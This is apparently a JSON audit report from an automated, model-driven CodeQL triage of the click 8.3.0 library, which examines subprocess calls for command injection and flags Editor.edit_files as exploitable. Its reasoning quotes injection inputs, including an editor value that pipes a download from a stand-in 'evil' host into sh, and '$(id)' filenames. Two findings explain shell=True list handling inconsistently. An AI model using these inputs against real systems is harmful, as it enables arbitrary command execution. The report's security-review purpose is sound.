@@ -1,0 +1,351 @@
+{
+ "session_id": "20261122121527",
+ "original_report": "reports/_nov2026/e5/DS4-r1/click-8.3.0/agent_codeql_report.json",
+ "package_name": "click-8.3.0",
+ "package_path": "packages/click-8.3.0",
+ "database_path": "databases/click-8.3.0-db",
+ "package_classification": {
+  "type": [
+   "library",
+   "framework"
+  ],
+  "layer": [
+   "library"
+  ]
+ },
+ "model": "deepseek/deepseek-flash",
+ "temperature": null,
+ "max_tokens": 8000,
+ "iterations": 25,
+ "total_input_tokens": 194832,
+ "total_output_tokens": 27374,
+ "total_tokens": 222206,
+ "elapsed_time_seconds": 258.45,
+ "estimated_cost_usd": 0.0,
+ "total_findings_submitted": 9,
+ "manual_review": 1,
+ "review_groups": {
+  "low_undetermined_high": 1,
+  "low_often_high": 1,
+  "medium_undetermined_high": 1
+ },
+ "tool_calls": {
+  "extract_code_snippet": 18,
+  "grep_search": 23,
+  "trace_dataflow_path": 0,
+  "submit_finding": 9,
+  "complete_review": 1
+ },
+ "true_positives": {
+  "critical": 0,
+  "high": 0,
+  "medium": 1,
+  "low": 0,
+  "total": 1
+ },
+ "false_positives": {
+  "critical": 0,
+  "high": 0,
+  "medium": 0,
+  "low": 6,
+  "total": 6
+ },
+ "findings": [
+  {
+   "codeql_query_uuids": [
+    "20261122120359"
+   ],
+   "finding_id": "69142600-942a-410f-b610-cdef82251557",
+   "verdict": "tp",
+   "confidence": 80,
+   "severity": "medium",
+   "cwe_ids": [
+    "cwe-78",
+    "cwe-88"
+   ],
+   "description": "Command injection in Editor.edit_files: unsanitized editor string and loosely-quoted filenames are interpolated into a shell command executed with shell=True",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 599,
+   "end_line": 605,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "        exc_filename = \" \".join(f'\"{filename}\"' for filename in filenames)\n\n        try:\n            c = subprocess.Popen(\n                args=f\"{editor} {exc_filename}\", env=environ, shell=True\n            )",
+   "reasoning": "Editor.edit_files builds a single command string `f\"{editor} {exc_filename}\"` and passes it to subprocess.Popen(..., shell=True). Two attacker-influenced inputs feed this string:\n\n1. `editor` — comes from `click.edit(editor=...)`, and if not supplied, from the `VISUAL`/`EDITOR` environment variables (Editor.get_editor). Neither is validated or quoted, so a value such as `vim; curl evil|sh` executes arbitrary commands.\n\n2. `filenames` — exposed publicly via `click.edit(filename=...)` / `click.termui.edit(filename=...)` which forwards directly to `ed.edit_files(filenames=filename)` (src/click/termui.py:772). Each filename is wrapped only in double quotes, which does NOT prevent shell expansion: `$(...)`, backticks and `\"` characters inside a filename still expand or break out of the quoting. A caller that passes a user-controlled path (a very common pattern: `click.edit(filename=argv_path)` or a path derived from user input) therefore gets arbitrary command execution.\n\nBecause shell=True is used with a string, the shell parses the full line; metacharacters in either component lead to command injection (CWE-78). Fix: pass a list of args with shell=False (and drop the manual quoting), or shlex.quote every component.",
+   "evidence": {
+    "code_context": "def get_editor(self) -> str:\n    if self.editor is not None:\n        return self.editor\n    for key in \"VISUAL\", \"EDITOR\":\n        rv = os.environ.get(key)\n        if rv:\n            return rv\n...\nexc_filename = \" \".join(f'\"{filename}\"' for filename in filenames)\nc = subprocess.Popen(args=f\"{editor} {exc_filename}\", env=environ, shell=True)",
+    "dataflow_analysis": "click.edit(filename=<untrusted path>) -> Editor.edit_files(filenames) -> join with only double quotes -> f-string interpolation with $EDITOR/$VISUAL or editor= argument -> subprocess.Popen(shell=True) -> /bin/sh -c",
+    "notes": "grep confirms shell=True only at src/click/_termui_impl.py:453 (pager) and :603 (editor). Public API src/click/termui.py:772 forwards user-supplied `filename` straight into edit_files."
+   },
+   "dataflow_path": null,
+   "group": "low_undetermined_high"
+  },
+  {
+   "codeql_query_uuids": [
+    "20261122120359"
+   ],
+   "finding_id": "391ad72a-2b6d-4661-afb9-f40c328e4d40",
+   "verdict": "fp",
+   "confidence": 70,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-78"
+   ],
+   "description": "_pipepager uses subprocess.Popen(shell=True) with a list; shell does not interpolate the extra list items, so PAGER contents cannot inject commands",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 451,
+   "end_line": 458,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "    c = subprocess.Popen(\n        [str(cmd_path)] + cmd_params,\n        shell=True,\n        stdin=subprocess.PIPE,\n        env=env,\n        errors=\"replace\",\n        text=True,\n    )",
+   "reasoning": "The pager command comes from `shlex.split(os.environ.get(\"PAGER\", \"\"), posix=False)`. With `shell=True` and a *sequence* on POSIX, subprocess treats `args[0]` as the shell command string and the remaining items as positional parameters ($0, $1, ...) for the shell — they are not concatenated into the parsed command line. Here `args[0]` is `str(cmd_path)`, an absolute resolved path produced by `shutil.which()` + `Path.resolve()`, not attacker input. So a PAGER value like `less; id` yields cmd_path = resolved path of `less;` (which will normally not be found, `shutil.which` returns None → early return) and the remaining tokens become inert shell positional args.\n\nAdditionally the source (`PAGER`) is the process's own environment, so an attacker able to set it already controls the process environment. Net: no practical injection path; residual risk is only theoretical (unusual executable path containing shell metacharacters) and shell=True here is a hardening/cleanup issue rather than an exploitable vulnerability.",
+   "evidence": {
+    "code_context": "pager_cmd_parts = shlex.split(os.environ.get(\"PAGER\", \"\"), posix=False)\n...\ncmd = cmd_parts[0]\ncmd_filepath = shutil.which(cmd)\nif not cmd_filepath: return False\ncmd_path = Path(cmd_filepath).resolve()\nc = subprocess.Popen([str(cmd_path)] + cmd_params, shell=True, ...)",
+    "dataflow_analysis": "os.environ['PAGER'] -> shlex.split -> cmd_parts[0] -> shutil.which -> resolved path -> args[0] of Popen(shell=True). Remaining parts become shell positional parameters, not command text.",
+    "notes": "POSIX subprocess semantics with shell=True and a sequence: only args[0] is handed to /bin/sh -c."
+   },
+   "dataflow_path": null,
+   "group": "low_undetermined_high"
+  },
+  {
+   "codeql_query_uuids": [
+    "20261122120359"
+   ],
+   "finding_id": "bec9066a-1213-46c9-a933-8519a5615720",
+   "verdict": "fp",
+   "confidence": 85,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-78"
+   ],
+   "description": "subprocess.call in _tempfilepager with fixed constant list arguments - no shell=True, no user input",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 538,
+   "end_line": 542,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "        subprocess.call([str(cmd_path), filename])",
+   "reasoning": "The call passes an argv list without shell=True; cmd_path comes from shutil.which(cmd) resolution of the pager command and filename is an mkstemp path. No shell interpretation occurs, so no command injection is possible. The only influence is the operator-controlled PAGER environment variable, which is by design a local code-execution knob equivalent to settings in the user's own shell.",
+   "evidence": {
+    "code_context": "def _tempfilepager(generator, cmd_parts, color): ... fd, filename = tempfile.mkstemp(); subprocess.call([str(cmd_path), filename])",
+    "notes": "No shell=True; argv list; filename is generated by tempfile.mkstemp()."
+   },
+   "dataflow_path": null,
+   "group": "low_undetermined_high"
+  },
+  {
+   "codeql_query_uuids": [
+    "20261122120359"
+   ],
+   "finding_id": "3e657534-dfed-4930-8587-dc98f23ed51f",
+   "verdict": "fp",
+   "confidence": 90,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-78"
+   ],
+   "description": "subprocess.run of bash --norc -c 'echo ${BASH_VERSION}' uses a constant command string",
+   "file_path": "src/click/shell_completion.py",
+   "start_line": 320,
+   "end_line": 323,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "            output = subprocess.run(\n                [bash_exe, \"--norc\", \"-c\", 'echo \"${BASH_VERSION}\"'],\n                stdout=subprocess.PIPE,\n            )",
+   "reasoning": "The command string passed to bash -c is a hard-coded literal ('echo \"${BASH_VERSION}\"') with no interpolation of external data, and no shell=True on the parent invocation. No attacker-controlled input reaches the command, so this is not an injection vulnerability.",
+   "evidence": {
+    "code_context": "bash_exe = shutil.which(\"bash\"); subprocess.run([bash_exe, \"--norc\", \"-c\", 'echo \"${BASH_VERSION}\"'], stdout=subprocess.PIPE)",
+    "notes": "Constant command; only path to bash binary discovered via shutil.which."
+   },
+   "dataflow_path": null,
+   "group": "low_undetermined_high"
+  },
+  {
+   "codeql_query_uuids": [
+    "20261122120359"
+   ],
+   "finding_id": "39b075cc-913d-4710-aa11-390eeef98720",
+   "verdict": "fp",
+   "confidence": 75,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-78"
+   ],
+   "description": "open_url subprocess calls pass argv lists (no shell=True) - url treated as a single argument",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 691,
+   "end_line": 729,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "        args = [\"open\"]\n        ...\n        args.append(_unquote_file(url))\n        ...\n            return subprocess.Popen(args, stderr=null).wait()\n...\n        args = [\"explorer\", f\"/select,{url}\"]\n...\n            args = [\"start\"]\n...\n            args.append(url)\n        try:\n            return subprocess.call(args)\n...\n        c = subprocess.Popen([\"xdg-open\", url])",
+   "reasoning": "All open_url invocations pass an argv list and never set shell=True, so the URL is delivered as a single argument and cannot break out into additional shell commands. The Windows \"start\"/\"explorer\" branches are cmd builtins that would fail (raising OSError caught below) rather than be shell-interpreted. The url is also supplied by the application developer calling click.launch(), not typically by an external attacker.",
+   "evidence": {
+    "code_context": "open_url(url, wait, locate) builds args lists and calls subprocess.Popen/call without shell=True",
+    "callers": "click/termui.py:802 launch(url) -> open_url(url, wait, locate)"
+   },
+   "dataflow_path": null,
+   "group": "low_undetermined_high"
+  },
+  {
+   "codeql_query_uuids": [
+    "20261122120359"
+   ],
+   "finding_id": "8892b613-e6dd-4894-9ec4-b5a9aae24d80",
+   "verdict": "fp",
+   "confidence": 80,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-78"
+   ],
+   "description": "_pipepager Popen with shell=True but quoted argv list of resolved pager path plus pager args",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 420,
+   "end_line": 458,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "    c = subprocess.Popen(\n        [str(cmd_path)] + cmd_params,\n        shell=True,\n        stdin=subprocess.PIPE,\n        env=env,\n        errors=\"replace\",\n        text=True,\n    )",
+   "reasoning": "Although shell=True is set, on POSIX the list form is converted with shlex.join of already-split parts, and cmd_parts originate solely from the local user's PAGER environment variable (shlex.split at line 382) or hard-coded defaults ('less', 'more'). There is no path in which an untrusted remote/application input reaches this command line; influencing PAGER already implies control of the user's environment. Hence not an exploitable injection in the library threat model (matching upstream click's documented behavior).",
+   "evidence": {
+    "code_context": "pager_cmd_parts = shlex.split(os.environ.get(\"PAGER\", \"\"), posix=False); Popen([str(cmd_path)] + cmd_params, shell=True,...)",
+    "notes": "Input is local environment variable only; defaults are constants."
+   },
+   "dataflow_path": null,
+   "group": "low_undetermined_high"
+  },
+  {
+   "codeql_query_uuids": [
+    "20261122120430"
+   ],
+   "finding_id": "f76421a8-ca95-4ea0-90f9-5f4b2ff28f68",
+   "verdict": "fp",
+   "confidence": 85,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-79"
+   ],
+   "description": "webbrowser.open() call in the xdg-open fallback of click.launch() — intentional, documented library behavior, not an injection sink",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 737,
+   "end_line": 737,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "    except OSError:\n        if url.startswith((\"http://\", \"https://\")) and not locate and not wait:\n            import webbrowser\n\n            webbrowser.open(url)\n            return 0\n        return 1",
+   "reasoning": "This is an audit rule (\"click/audit/webbrowser-calls\") flagging the informational sink of opening a browser. The URL is a direct argument of the public documented API click.launch()/click.termui.launch(url) — its entire purpose is \"launch the given URL in the default viewer application\". The fallback path is guarded by url.startswith((\"http://\", \"https://\")), so no file:// or javascript:/data: URL can reach webbrowser.open from this branch (all non-http URLs return 1). No attacker-controlled data flow exceeds the caller's own explicit argument: any application passing untrusted input into click.launch() would be making an intentional \"open this URL\" decision; that is the API contract, not a vulnerability in click. There is no eval/exec/shell evaluation here, so no CWE-79/78 risk inside the library. Note the other subprocess sinks in the same function (subprocess.Popen([\"xdg-open\", url])) use list args without shell=True, so no command injection exists on that path either.",
+   "evidence": {
+    "code_context": "def open_url(url: str, wait: bool = False, locate: bool = False) -> int:\n    ...\n    try:\n        if locate:\n            url = os.path.dirname(_unquote_file(url)) or \".\"\n        else:\n            url = _unquote_file(url)\n        c = subprocess.Popen([\"xdg-open\", url])   # list args, no shell=True\n        ...\n    except OSError:\n        if url.startswith((\"http://\", \"https://\")) and not locate and not wait:\n            import webbrowser\n            webbrowser.open(url)",
+    "dataflow_analysis": "Call chain: click.launch(url) [src/click/termui.py:776-802] -> open_url(url) [src/click/_termui_impl.py:671] -> webbrowser.open(url) at 737. Source is an explicit API parameter supplied by the developer of the CLI application, not a hidden parse of untrusted input inside the library. Scheme allow-list (http/https) restricts the fallback call.",
+    "notes": "Only executable 'sink' in the function that has a real injection class is subprocess with shell=True elsewhere in the file (see separate findings); webbrowser.open is a browser-navigation API, not a code-execution sink."
+   },
+   "dataflow_path": null,
+   "group": "low_often_high"
+  },
+  {
+   "codeql_query_uuids": [],
+   "finding_id": "4f32f22e-bb76-43ae-9279-fc1aac8b4690",
+   "verdict": "dup",
+   "confidence": 65,
+   "severity": "medium",
+   "cwe_ids": [
+    "cwe-78",
+    "cwe-74"
+   ],
+   "description": "OS command injection in Editor.edit_files(): filenames are interpolated into a shell command string executed with shell=True, allowing break-out via embedded double quotes",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 599,
+   "end_line": 604,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "        exc_filename = \" \".join(f'\"{filename}\"' for filename in filenames)\n\n        try:\n            c = subprocess.Popen(\n                args=f\"{editor} {exc_filename}\", env=environ, shell=True\n            )\n            exit_code = c.wait()",
+   "reasoning": "edit_files() builds a single command string `f\"{editor} {exc_filename}\"` where each filename is only wrapped in literal double quotes, then executes it with shell=True. The quoting is not shell escaping: a filename containing a double quote (legal on POSIX and, in most directories, on Windows) terminates the quoted region and lets the attacker append arbitrary shell metacharacters (`;`, `&&`, `$(...)`, backticks). click.edit(filename=...) (src/click/termui.py:772) passes caller-provided filenames straight into this method, so any CLI built with `click.edit(filename=...)`/`click.edit_files()` on attacker-influenced paths yields arbitrary command execution. Also worth noting: filenames are joined with spaces inside quotes without escaping, so `$`/backtick expansion inside double quotes occurs even without breaking out (e.g. a file literally named `$(id)` is expanded, since double quotes still allow command substitution).",
+   "evidence": {
+    "code_context": "def edit_files(self, filenames: cabc.Iterable[str]) -> None:\n    import subprocess\n    editor = self.get_editor()\n    ...\n    exc_filename = \" \".join(f'\"{filename}\"' for filename in filenames)\n    c = subprocess.Popen(args=f\"{editor} {exc_filename}\", env=environ, shell=True)",
+    "dataflow_analysis": "click.termui.edit(filename=...) -> ed.edit_files(filenames=filename) [src/click/termui.py:772] -> Editor.edit_files [src/click/_termui_impl.py:589] -> f-string concatenation at 599 -> subprocess.Popen(..., shell=True) at 602-604. No shlex.quote() or validation of filenames anywhere in the path.",
+    "notes": "Existing tests in tests/test_termui.py:382,392 pass `editor=\"sed -i~ 's/$/Test/'\"`, confirming that the whole string is evaluated by a shell. get_editor() also allows the command to be taken from the EDITOR/VISUAL environment variables, so both the command and the arguments are shell-interpreted."
+   },
+   "dataflow_path": null,
+   "group": "low_often_high"
+  },
+  {
+   "codeql_query_uuids": [],
+   "finding_id": "9984595b-e070-4ead-9773-4c8a25b654a7",
+   "verdict": "mr",
+   "confidence": 45,
+   "severity": "low",
+   "cwe_ids": [
+    "cwe-78",
+    "cwe-79"
+   ],
+   "description": "Pager invocation uses shell=True with a command path derived from environment variables (PAGER/LESS), plus pager params",
+   "file_path": "src/click/_termui_impl.py",
+   "start_line": 451,
+   "end_line": 459,
+   "start_column": null,
+   "end_column": null,
+   "code_snippet": "    c = subprocess.Popen(\n        [str(cmd_path)] + cmd_params,\n        shell=True,\n        stdin=subprocess.PIPE,\n        env=env,\n        errors=\"replace\",\n        text=True,\n    )",
+   "reasoning": "pager() resolves the pager binary from the PAGER env var / config-supplied value and then invokes it with shell=True. Whoever controls the PAGER value (or the calling application's pager config, which can be attacker-influenced in multi-tenant/plugin scenarios) could inject shell metacharacters. In practice the pager command comes from the local environment and this mirrors the upstream behavior, so it is a low-severity/manual-review item rather than a definite exploitable injection. Note shell=True with a list only passes args[0] to the shell and the rest as positional args, which further limits exploitation.",
+   "evidence": {
+    "code_context": "def pager(generator, color=None, ...):\n    cmd, cmd_params = find_pager()\n    cmd_path = Path(cmd_filepath).resolve()\n    ...\n    c = subprocess.Popen([str(cmd_path)] + cmd_params, shell=True, stdin=subprocess.PIPE, env=env, errors=\"replace\", text=True)",
+    "notes": "User/environment-controlled pager command combined with shell=True; typical CLI convention (same as git/less integration), low exploitability."
+   },
+   "dataflow_path": null,
+   "group": "low_often_high"
+  }
+ ],
+ "cache_usage": {
+  "prompt_tokens_total": 194832,
+  "uncached_input_tokens": 21904,
+  "cache_creation_input_tokens": 0,
+  "cache_read_input_tokens": 172928,
+  "output_tokens": 27374,
+  "calls": 25,
+  "caching_enabled": false,
+  "cost_usd_with_cache": 0.020229,
+  "cost_usd_no_cache": 0.045649,
+  "cache_read_share_of_prompt": 0.8876,
+  "prices_per_mtok": {
+   "claude-sonnet-4-5-20250929": {
+    "input": 3.0,
+    "output": 15.0
+   },
+   "claude-haiku-4-5-20251001": {
+    "input": 1.0,
+    "output": 5.0
+   },
+   "deepseek/deepseek-reasoner": {
+    "input": 0.15,
+    "output": 0.6,
+    "cache_read": 0.003,
+    "cache_write_mult": 1.0,
+    "peak_mult": 2.0
+   },
+   "gpt-5.1": {
+    "input": 1.25,
+    "output": 10.0,
+    "cache_read": 0.125,
+    "cache_write_mult": 1.0
+   },
+   "gpt-4.1": {
+    "input": 2.0,
+    "output": 8.0,
+    "cache_read": 0.5,
+    "cache_write_mult": 1.0
+   },
+   "deepseek/deepseek-v4-pro": {
+    "input": 0.66,
+    "output": 1.98,
+    "cache_read": 0.022,
+    "cache_write_mult": 1.0,
+    "peak_mult": 2.0
+   },
+   "deepseek/deepseek-flash": {
+    "input": 0.15,
+    "output": 0.6,
+    "cache_read": 0.003,
+    "cache_write_mult": 1.0,
+    "peak_mult": 2.0
+   }
+  },
+  "cache_multipliers": {
+   "write_5m": 1.25,
+   "read": 0.1
+  }
+ }
+}
